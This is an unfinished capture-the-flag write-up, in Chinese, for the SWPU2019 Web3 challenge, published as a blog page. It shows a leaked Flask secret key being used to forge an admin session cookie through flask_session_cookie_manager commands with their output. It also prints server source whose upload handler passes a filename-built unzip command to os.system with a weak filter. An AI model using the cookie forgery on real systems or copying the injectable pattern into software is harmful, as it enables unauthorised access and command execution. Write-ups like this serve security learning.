@@ -1,0 +1,139 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><meta name="author" content="suyumen"><meta name="renderer" content="webkit"><meta name="copyright" content="suyumen"><meta name="keywords" content="SUYUMEN"><meta name="description" content=""><meta name="Cache-Control" content="no-cache"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><title>SWPU2019-Web3 · SUYUMEN</title><link rel="stylesheet" href="/css/style.css?v=2018.7.9"><link rel="stylesheet" href="/css/animation.css?v=2018.7.9"><link rel="icon" href="/img/assets/favicon.ico"><link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css?version=1.5.6"><!-- scripts--><script>(function( w ){
+  "use strict";
+  // rel=preload support test
+  if( !w.loadCSS ){
+    w.loadCSS = function(){};
+  }
+  // define on the loadCSS obj
+  var rp = loadCSS.relpreload = {};
+  // rel=preload feature support test
+  // runs once and returns a function for compat purposes
+  rp.support = (function(){
+    var ret;
+    try {
+      ret = w.document.createElement( "link" ).relList.supports( "preload" );
+    } catch (e) {
+      ret = false;
+    }
+    return function(){
+      return ret;
+    };
+  })();
+
+  // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+  // then change that media back to its intended value on load
+  rp.bindMediaToggle = function( link ){
+    // remember existing media attr for ultimate state, or default to 'all'
+    var finalMedia = link.media || "all";
+
+    function enableStylesheet(){
+      link.media = finalMedia;
+    }
+
+    // bind load handlers to enable media
+    if( link.addEventListener ){
+      link.addEventListener( "load", enableStylesheet );
+    } else if( link.attachEvent ){
+      link.attachEvent( "onload", enableStylesheet );
+    }
+
+    // Set rel and non-applicable media type to start an async request
+    // note: timeout allows this to happen async to let rendering continue in IE
+    setTimeout(function(){
+      link.rel = "stylesheet";
+      link.media = "only x";
+    });
+    // also enable media after 3 seconds,
+    // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+    setTimeout( enableStylesheet, 3000 );
+  };
+
+  // loop through link elements in DOM
+  rp.poly = function(){
+    // double check this to prevent external calls from running
+    if( rp.support() ){
+      return;
+    }
+    var links = w.document.getElementsByTagName( "link" );
+    for( var i = 0; i < links.length; i++ ){
+      var link = links[ i ];
+      // qualify links to those with rel=preload and as=style attrs
+      if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+        // prevent rerunning on link
+        link.setAttribute( "data-loadcss", true );
+        // bind listeners to toggle media back
+        rp.bindMediaToggle( link );
+      }
+    }
+  };
+
+  // if unsupported, run the polyfill
+  if( !rp.support() ){
+    // run once at least
+    rp.poly();
+
+    // rerun poly on an interval until onload
+    var run = w.setInterval( rp.poly, 500 );
+    if( w.addEventListener ){
+      w.addEventListener( "load", function(){
+        rp.poly();
+        w.clearInterval( run );
+      } );
+    } else if( w.attachEvent ){
+      w.attachEvent( "onload", function(){
+        rp.poly();
+        w.clearInterval( run );
+      } );
+    }
+  }
+
+
+  // commonjs
+  if( typeof exports !== "undefined" ){
+    exports.loadCSS = loadCSS;
+  }
+  else {
+    w.loadCSS = loadCSS;
+  }
+}( typeof global !== "undefined" ? global : this ) );</script><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" defer></script><script src="/js/main.js?v=2018.7.9" defer></script><!-- fancybox--><link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script><!-- busuanzi--><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><meta name="generator" content="Hexo 5.4.0"></head><body><section class="profile-close" id="cxo-profile"><div class="profile-avatar"><i class="fa fa-caret-left"></i><img src="/img/assets/avatar.jpg"></div><!--.profile-saying
+  i.fa.fa-comment
+  .saying--><div class="cxo-profile-inner"><div class="profile-name">suyumen</div><div class="profile-signature">目前主要在学习web相关</div><div class="read-progress"></div></div></section><header id="cxo-intro" style="height: 70vh;background-image: url(/img/intro/back.jpg);"><nav id="cxo-intro-nav"><section><div class="intro-nav-title"><a href="/">SUYUMEN</a></div><div class="intro-nav-label-box"><a href="/">Home</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div><i class="fa fa-bars intro-nav-menu"><div class="intro-nav-drop"><a href="/">Home</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div></i><div class="clear"></div></section></nav><h1 class="post-title">SWPU2019-Web3</h1><div class="post-intros"><div class="post-intro-meta"><span class="post-intro-time"><i class="post-intro-calendar fa fa-calendar"></i><span>2021-08-13</span></span><span class="post-intro-tags"><a class="intro-tag fa fa-tag" href="javascript:void(0)" date-tags="session-flask"> session-flask</a></span></div><div class="post-intro-read"><span> Word count: <span class="post-count">819</span> | Reading time: <span class="post-count">4</span>min</span></div></div></header><article class="cxo-up" id="cxo-content-outer"><section id="cxo-content-inner"><article class="article-entry" id="post"><hr>
+<p>之前博客放github仓库的图片半天打不开，怀疑是那个<code>raw.githubusercontent.com</code>网址必须要挂梯子了；然后偷窥了一些群友的blog，观察了一下图片的链接，终于在KKfine的博客里发现了我能用的办法，悟了，偷学成功~ :laughing: 点进去是登录界面，试了一下<code>admin</code>和<code>1</code>，能登录进去，试了<code>&#39;</code>,<code>&quot;</code>都没有报错信息，应该不是<code>sql</code>注入，登录后的页面有个<code>upload</code>，点击了说没权限。</p>
+<span id="more"></span>
+
+<p>返回登录界面抓了个包，观察到<code>cookie</code>里有<code>session</code>，怀疑是<code>flask-session</code>伪造，但是目前没找到<code>secretkey</code>。。</p>
+<p>扫了一下主站点，没东西，看了页面源码，登录后比登录前多的内容是404这段：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">404 not found</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>还有一些前端以前刷题没见过的符号hh</p>
+<blockquote>
+<p><code>CSS</code>中，<code>::before</code> 创建一个伪元素，其将成为匹配选中的元素的第一个子元素。常通过 <code>content</code> 属性来为一个元素添加修饰性的内容。此元素默认为行内元素。</p>
+</blockquote>
+<p>访问一个<code>404</code>界面查看一下返回包：</p>
+<p><img src="https://img-blog.csdnimg.cn/bd6d11f664e7478f94e51718e8eede77.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTc2Nzk1Mg==,size_16,color_FFFFFF,t_70#pic_center"></p>
+<p>得到了：</p>
+<blockquote>
+<p>session=eyJpZCI6eyIgYiI6Ik1UQXcifSwiaXNfbG9naW4iOnRydWUsInBhc3N3b3JkIjoiMSIsInVzZXJuYW1lIjoiYWRtaW4ifQ.YRYr6A.Ad53SddOOcYYe0AJ610_Xt8No8w</p>
+</blockquote>
+<blockquote>
+<p>Swpuctf_csrf_token: U0VDUkVUX0tFWTprZXlxcXF3d3dlZWUhQCMkJV4mKg==</p>
+</blockquote>
+<p>把<code>Swpuctf_csrf_token</code>base64解密一下得到：</p>
+<p><code>SECRET_KEY:keyqqqwwweee!@#$%^&amp;*</code></p>
+<p>跑脚本解密：</p>
+<blockquote>
+<p>python flask_session_cookie_manager3.py decode -c “eyJpZCI6eyIgYiI6Ik1UQXcifSwiaXNfbG9naW4iOnRydWUsInBhc3N3b3JkIjoiMSIsInVzZXJuYW1lIjoiYWRtaW4ifQ.YRYr6A.Ad53SddOOcYYe0AJ610_Xt8No8w” -s “keyqqqwwweee!@#$%^&amp;*”<br>{‘id’: b’100’, ‘is_login’: True, ‘password’: ‘1’, ‘username’: ‘admin’}</p>
+</blockquote>
+<p>就是<code>id</code>上做文章了，尝试把<code>id</code>改成<code>1</code>再加密：</p>
+<blockquote>
+<p>python flask_session_cookie_manager3.py encode -s “keyqqqwwweee!@#$%^&amp;*” -t “{‘id’: ‘1’, ‘is_login’: True, ‘password’: ‘1’, ‘username’: ‘admin’}”<br>eyJpZCI6IjEiLCJpc19sb2dpbiI6dHJ1ZSwicGFzc3dvcmQiOiIxIiwidXNlcm5hbWUiOiJhZG1pbiJ9.YRY5BQ.mCQylPeAnRZg7QoK7AGa7va9qYY</p>
+</blockquote>
+<hr>
+<p>修改<code>session</code>后，可以打开<code>upload</code>界面了，上传了一个<code>.php</code>后缀的一句话木马，显示必须要上传<code>.zip</code>文件，看了下页面源码,发现一长段（看不太懂的）注释：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">@app.route(<span class="string">&#x27;/upload&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>])</span><br><span class="line">def upload():</span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&#x27;id&#x27;</span>] != <span class="string">b&#x27;1&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template_string(temp)</span><br><span class="line">    <span class="keyword">if</span> request.method==<span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        m = hashlib.md5()</span><br><span class="line">        name = session[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        name = name+<span class="string">&#x27;qweqweqwe&#x27;</span></span><br><span class="line">        name = name.encode(encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        m.update(name)</span><br><span class="line">        md5_one= m.hexdigest()</span><br><span class="line">        n = hashlib.md5()</span><br><span class="line">        ip = request.remote_addr</span><br><span class="line">        ip = ip.encode(encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        n.update(ip)</span><br><span class="line">        md5_ip = n.hexdigest()</span><br><span class="line">        f=request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">        basepath=os.path.dirname(os.path.realpath(<span class="keyword">__file__</span>))</span><br><span class="line">        path = basepath+<span class="string">&#x27;/upload/&#x27;</span>+md5_ip+<span class="string">&#x27;/&#x27;</span>+md5_one+<span class="string">&#x27;/&#x27;</span>+session[<span class="string">&#x27;username&#x27;</span>]+<span class="string">&quot;/&quot;</span></span><br><span class="line">        path_base = basepath+<span class="string">&#x27;/upload/&#x27;</span>+md5_ip+<span class="string">&#x27;/&#x27;</span></span><br><span class="line">        filename = f.filename</span><br><span class="line">        pathname = path+filename</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;zip&quot;</span> != filename.split(<span class="string">&#x27;.&#x27;</span>)[-<span class="number">1</span>]:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;zip only allowed&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> not os.path.exists(path_base):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                os.makedirs(path_base)</span><br><span class="line">            except <span class="built_in">Exception</span> <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> not os.path.exists(path):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                os.makedirs(path)</span><br><span class="line">            except <span class="built_in">Exception</span> <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> not os.path.exists(pathname):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                f.save(pathname)</span><br><span class="line">            except <span class="built_in">Exception</span> <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            cmd = <span class="string">&quot;unzip -n -d &quot;</span>+path+<span class="string">&quot; &quot;</span>+ pathname</span><br><span class="line">            <span class="keyword">if</span> cmd.find(<span class="string">&#x27;|&#x27;</span>) != -<span class="number">1</span> <span class="keyword">or</span> cmd.find(<span class="string">&#x27;;&#x27;</span>) != -<span class="number">1</span>:</span><br><span class="line">				waf()</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line">            os.system(cmd)</span><br><span class="line">        except <span class="built_in">Exception</span> <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line">        unzip_file = zipfile.ZipFile(pathname,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">        unzip_filename = unzip_file.namelist()[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> session[<span class="string">&#x27;is_login&#x27;</span>] != <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;not login&#x27;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> unzip_filename.find(<span class="string">&#x27;/&#x27;</span>) != -<span class="number">1</span>:</span><br><span class="line">                shutil.rmtree(path_base)</span><br><span class="line">                os.mkdir(path_base)</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line">            image = open(path+unzip_filename, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">            resp = make_response(image)</span><br><span class="line">            resp.headers[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&#x27;image/png&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> resp</span><br><span class="line">        except <span class="built_in">Exception</span> <span class="keyword">as</span> e:</span><br><span class="line">            shutil.rmtree(path_base)</span><br><span class="line">            os.mkdir(path_base)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;upload.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(<span class="string">&#x27;/showflag&#x27;</span>)</span><br><span class="line">def showflag():</span><br><span class="line">    <span class="keyword">if</span> <span class="literal">True</span> == <span class="literal">False</span>:</span><br><span class="line">        image = open(os.path.join(<span class="string">&#x27;./flag/flag.jpg&#x27;</span>), <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">        resp = make_response(image)</span><br><span class="line">        resp.headers[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&#x27;image/png&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> resp</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;can&#x27;t give you&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>明天再看。</p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://suyumen.github.io/2021/05/13/2021-05-13-%5BFBCTF2019%5DEvent/">https://suyumen.github.io/2021/05/13/2021-05-13-%5BFBCTF2019%5DEvent/</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/a3320315/article/details/103760266">https://blog.csdn.net/a3320315/article/details/103760266</a></p>
+</article><!-- lincense--><div class="license-wrapper"><p> <span>Author:  </span><a href="https://suyumen.github.io">suyumen</a></p><p> <span>Link:  </span><a href="https://suyumen.github.io/2021/08/13/2021-08-13-[SWPU2019]Web3/">https://suyumen.github.io/2021/08/13/2021-08-13-[SWPU2019]Web3/</a></p><p> <span>Copyright:  </span><span>All articles in this blog are licensed under <a rel="license noopener" target="_blank" href="https://creativecommons.org/licenses/by-nc-nd/3.0">CC BY-NC-SA 3.0</a> unless stating additionally.</span></p></div><div class="post-paginator"><a class="nextSlogan" href="/2021/08/09/2021-08-09-Docker%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" title="Docker环境搭建"><span>NextPost ></span><br><span class="nextTitle">Docker环境搭建</span></a><div class="clear"></div></div><div id="comment"></div></section></article><footer id="cxo-footer-outer"><div id="cxo-footer-inner"><p class="footer-container"><span>Site by <span>Hexo</span></span><span> | theme <span>Cxo</span></span></p><i class="fa fa-user"> </i><span id="busuanzi_value_site_uv"></span><span> | </span><i class="fa fa-eye"> </i><span id="busuanzi_value_site_pv"></span></div></footer><!-- catelog--><div class="toc-wrapper" style="top: 70vh;"><div class="toc-catalog"><i class="fa fa-list"> </i><span>CATALOG</span></div><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">1.</span> <span class="toc-text">参考</span></a></li></ol></div><!-- top--><i class="fa fa-arrow-up close" id="go-up" aria-hidden="true"></i></body></html>
